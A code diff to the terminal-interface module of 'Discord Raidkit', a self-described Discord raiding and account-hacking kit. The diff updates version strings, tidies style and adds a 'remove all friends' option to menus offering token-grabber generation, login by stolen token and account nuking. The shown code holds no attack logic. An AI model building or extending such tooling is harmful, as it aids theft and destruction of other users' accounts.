@@ -1,5 +1,5 @@
-'''
-Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
+"""
+Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,15 +8,15 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 display.py handles the user interface aspect of Discord Raidkit, showing any information to the user.
-display.py was last updated on 11/08/22 at 12:54.
-'''
+display.py was last updated on 06/09/22 at 18:18.
+"""
 
 from colorama import Back, Fore, Style, init
 
+from constants import CURRENT_VERSION
 from utils import clear
 
 init()
-
 
 THEMES = {
     "default": {
@@ -57,7 +57,7 @@ def change_brightness(brightness: str = '') -> None:
 
 
 def validate_theme(theme: str) -> str:
-    if not theme in THEMES.keys():
+    if theme not in THEMES.keys():
         return 'default'
     else:
         return theme
@@ -67,7 +67,7 @@ def show_main_raidkit(theme: str, prefix: str, hint: str = '') -> None:
     clear()
     theme = validate_theme(theme)
     print(f'''{THEMES[theme]["secondary"]}
-Discord Raidkit v2.3.0
+Discord Raidkit {CURRENT_VERSION}
 © 2022 the-cult-of-integral
 
 {THEMES[theme]["tertiary"]}
@@ -108,7 +108,7 @@ def show_sync_msg(theme: str) -> None:
 def show_welcome_menu(theme: str) -> None:
     clear()
     theme = validate_theme(theme)
-    print(f'''{THEMES[theme]["secondary"]}Welcome to Discord Raidkit v2.3.0!
+    print(f'''{THEMES[theme]["secondary"]}Welcome to Discord Raidkit {CURRENT_VERSION}!
 
 {THEMES[theme]["primary"]}This program is a collection of tools for discord, including raiders and account hackers.
 This program is maintained by https://github.com/the-cult-of-integral and is open source! {THEMES[theme]["important"][0]}
@@ -147,7 +147,7 @@ def show_osiris_screen(theme: str, hint: str) -> None:
     theme = validate_theme(theme)
 
     print(f'''{THEMES[theme]["secondary"]}
-Discord Raidkit v2.3.0
+Discord Raidkit {CURRENT_VERSION}
 © 2022 the-cult-of-integral
 
 {THEMES[theme]["tertiary"]}
@@ -162,8 +162,9 @@ Discord Raidkit v2.3.0
 {THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}1{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Generate a user authentication token grabber.
 {THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}2{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Find information about a user by user authentication token.
 {THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}3{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Log into a user account by user authentication token.
-{THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}4{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Nuke a user account by user authentication token.
-{THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}5{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Exit.
+{THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}4{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Remove all friends from a user account.
+{THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}5{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Nuke a user account by user authentication token.
+{THEMES[theme]["secondary"]}[{THEMES[theme]["primary"]}6{THEMES[theme]["secondary"]}] {THEMES[theme]["tertiary"]}Exit.
 
 {THEMES[theme]["important"][0]}{hint}
 
@@ -181,7 +182,7 @@ def show_cfg_screen(config: dict) -> None:
     theme = validate_theme(config["theme"])
 
     screen = f'''{THEMES[theme]["secondary"]}
-Discord Raidkit v2.3.0
+Discord Raidkit {CURRENT_VERSION}
 © 2022 the-cult-of-integral
 
 {THEMES[theme]["tertiary"]}
@@ -197,7 +198,7 @@ Discord Raidkit v2.3.0
 {THEMES[theme]["primary"]}
 [1] Token '''
 
-    if (a := config["token"]):
+    if a := config["token"]:
         screen += f'{THEMES[theme]["secondary"]}<set>{THEMES[theme]["primary"]}'
     else:
         screen += f'{THEMES[theme]["important"][0]}<not set!>{THEMES[theme]["primary"]}'
@@ -205,7 +206,7 @@ Discord Raidkit v2.3.0
     screen += f'''
 [2] App ID '''
 
-    if (b := config["app_id"]):
+    if b := config["app_id"]:
         screen += f'{THEMES[theme]["secondary"]}<set>{THEMES[theme]["primary"]}'
     else:
         screen += f'{THEMES[theme]["important"][0]}<not set!>{THEMES[theme]["primary"]}'
@@ -213,14 +214,14 @@ Discord Raidkit v2.3.0
     screen += f'''
 [3] Prefix '''
 
-    if (c := config["prefix"]):
+    if c := config["prefix"]:
         screen += f'{THEMES[theme]["secondary"]}<set>{THEMES[theme]["primary"]}'
     else:
         screen += f'{THEMES[theme]["important"][0]}<not set!>{THEMES[theme]["primary"]}'
 
     screen += f'''
 [4] Statuses '''
-    if (d := all(s for s in config["statuses"])):
+    if d := all(s for s in config["statuses"]):
         screen += f'{THEMES[theme]["secondary"]}<set>{THEMES[theme]["primary"]}'
     else:
         screen += f'{THEMES[theme]["important"][0]}<not set!>{THEMES[theme]["primary"]}'
@@ -228,7 +229,7 @@ Discord Raidkit v2.3.0
     screen += f'''
 [5] Verbose '''
 
-    if (e := str(config["verbose"])):
+    if e := str(config["verbose"]):
         screen += f'{THEMES[theme]["secondary"]}<set>'
     else:
         screen += f'{THEMES[theme]["important"][0]}<not set!>'
